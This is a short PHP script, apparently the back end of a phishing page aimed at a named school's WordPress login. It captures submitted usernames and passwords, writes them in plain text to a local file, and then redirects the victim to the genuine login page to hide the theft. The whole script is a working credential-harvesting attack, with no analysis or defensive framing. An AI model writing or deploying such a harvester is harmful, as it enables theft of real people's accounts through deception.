<?php

$file = fopen("test.txt","a");

$username = $_POST['username'];
$password = $_POST['password'];

fwrite($file, "Nom d utilisateur :" . $username . "\n");
fwrite($file, "Mot de passe :" . $password . "\n\n");

fclose($file);

header("location: https://campus.ingetis.com/wp-login.php");

exit;
?>